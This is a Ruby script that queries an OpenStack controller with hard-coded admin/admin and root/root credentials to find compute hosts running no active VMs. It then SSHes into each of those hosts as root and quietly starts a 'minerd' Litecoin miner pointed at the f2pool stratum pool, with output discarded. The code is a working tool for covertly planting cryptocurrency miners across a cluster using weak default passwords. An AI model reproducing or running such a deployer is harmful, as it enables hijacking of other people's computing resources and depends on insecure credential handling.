require 'net/ssh'
require 'set'
report = {}
threads = []
#controller, tot = [1, 5]
controller, tot = [208, 182]
client = 1
ori = "nova --os-username admin --os-password admin --os-tenant-name admin --os-auth-url http://10.1.0.#{controller}:5000/v2.0"
cmd_list = "#{ori} list --all_tenants"
machine_list = Set.new
1.upto(tot) {|x| machine_list << x}
rgx = /\|(.*?)\|(.*?)\|(.*?)\|(.*?)\|/


t = Thread.new do
  begin
    Net::SSH.start("10.1.0.#{client}", "root", :password => "root", :auth_methods => ['password']) do |ssh|
      ss = ssh.exec!("#{cmd_list}")
      ss = ss.gsub(/\s/, "")
      ss=ss.sub(rgx, "")
      while( (ss.match(rgx)) ) do
        out = ss.match(rgx)
#        puts out
#        puts out[1]
        sss = ssh.exec!("#{ori} show #{out[1]}").gsub(/\s/, "")
        ss = ss.sub(rgx, "")
        vm_state = sss.match(/OS\-EXT\-STS\:vm\_state\|(\w*?)\|/)
#        puts $1
        if ["error", "deleted", "stopped"].include?($1) then
          next
        end
        host = sss.match(/OS\-EXT\-SRV\-ATTR\:host\|n(\d+?)\|/)
#        puts $1
        machine_list.delete($1.to_i)
#       puts machine_list
      end
    end
  rescue
    puts "failed on nova command"
  end
end
sleep(0.2)
puts "wating for slow process.... " until t.join(30)

#machine_list.each do |m|
#  print "#{m}, "
#end

machine_list.each do |m|
  puts m
  puts m.class
  puts "10.1.0.#{m}"
  t = Thread.new do
    begin
      Net::SSH.start("10.1.0.#{m}", "root", :password => "root", :auth_methods => ['password']) do |ssh|
        out = ssh.exec!("ps -e |grep minerd")
#        puts out
        if out == nil || !out.match(/minerd/) then
          out = ssh.exec!("/root/minerd -q --url=stratum+tcp://stratum.f2pool.com:8888 --userpass=dradra.ltc#{m}:pass --threads=24 > /dev/null 2>&1 &")
        end
      end
    rescue
      puts "failed on #{m}"
    end
  end
  threads << t
  sleep(0.2)
end
threads.each do |t|
  puts "wating for slow process.... " until t.join(30)
end

